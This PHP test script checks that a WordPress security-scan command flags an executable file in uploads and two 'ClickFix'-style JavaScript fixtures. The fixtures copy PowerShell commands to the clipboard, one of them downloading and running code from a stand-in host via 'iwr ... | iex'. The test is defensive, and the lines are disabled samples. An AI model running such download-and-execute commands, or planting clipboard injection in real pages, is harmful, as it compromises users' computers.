<?php
/**
 * End-to-end regression coverage for file-context routing.
 */

define( 'WP_CLI', true );

class WP_CLI {
	public static function add_command( $name, $class ) {}
	public static function error( $message ) {
		throw new RuntimeException( $message );
	}
}

require dirname( __DIR__ ) . '/src/PhpDataFlowAnalyzer.php';
require dirname( __DIR__ ) . '/src/SecurityScanCommand.php';

$root = sys_get_temp_dir() . '/wp-security-scan-routing-' . getmypid();
$uploads = $root . '/uploads';
$other = $root . '/other';
@mkdir( $uploads, 0777, true );
@mkdir( $other, 0777, true );

$upload_php = $uploads . '/security-test.php';
file_put_contents(
	$upload_php,
	"<?php\nfunction security_scan_upload_test() {\n\treturn 'security scan test';\n}\n"
);

$clickfix_download = $other . '/clickfix-download.js';
file_put_contents(
	$clickfix_download,
	<<<'JS'
if (false) {
	const command =
		'powershell.exe -Command "iwr https://example.invalid/test | iex"';

	navigator.clipboard.writeText(command);
}
JS
);

$clickfix_encoded = $other . '/clickfix-encoded.js';
file_put_contents(
	$clickfix_encoded,
	<<<'JS'
if (false) {
	const command =
		'powershell.exe -EncodedCommand TEST_SECURITY_SCAN';

	navigator.clipboard.writeText(command);
}
JS
);

$command = new Security_Scan_Command();
$reflection = new ReflectionClass( $command );

foreach ( [ 'content_dir' => $root, 'uploads_dir' => $uploads ] as $property => $value ) {
	$ref = $reflection->getProperty( $property );
	$ref->setAccessible( true );
	$ref->setValue( $command, $value );
}

$interactive = $reflection->getProperty( 'interactive' );
$interactive->setAccessible( true );
$interactive->setValue( $command, false );

$load_rules = $reflection->getMethod( 'load_rules' );
$load_rules->setAccessible( true );
$load_rules->invoke( $command );

$scan_file = $reflection->getMethod( 'scan_file' );
$scan_file->setAccessible( true );
$scan_file->invoke( $command, 'Uploads', $upload_php, true );
$scan_file->invoke( $command, 'Other wp-content', $clickfix_download, false );
$scan_file->invoke( $command, 'Other wp-content', $clickfix_encoded, false );

$findings_ref = $reflection->getProperty( 'findings' );
$findings_ref->setAccessible( true );
$findings = $findings_ref->getValue( $command );

$rules_by_location = [];
foreach ( $findings as $finding ) {
	$rules_by_location[ $finding['location'] ][] = $finding['rule'];
}

$checks = [
	'uploads/security-test.php' => 'uploads_executable',
	'other/clickfix-download.js' => 'js_clickfix_clipboard_command',
	'other/clickfix-encoded.js' => 'js_clickfix_clipboard_command',
];

$failed = 0;
foreach ( $checks as $location => $rule ) {
	$matched = isset( $rules_by_location[ $location ] ) && in_array( $rule, $rules_by_location[ $location ], true );
	echo ( $matched ? 'PASS  ' : 'FAIL  ' ) . $location . ' => ' . $rule . PHP_EOL;
	if ( ! $matched ) {
		$failed++;
	}
}

@unlink( $upload_php );
@unlink( $clickfix_download );
@unlink( $clickfix_encoded );
@rmdir( $uploads );
@rmdir( $other );
@rmdir( $root );

if ( $failed > 0 ) {
	exit( 1 );
}

echo PHP_EOL . 'File-routing smoke tests passed.' . PHP_EOL;
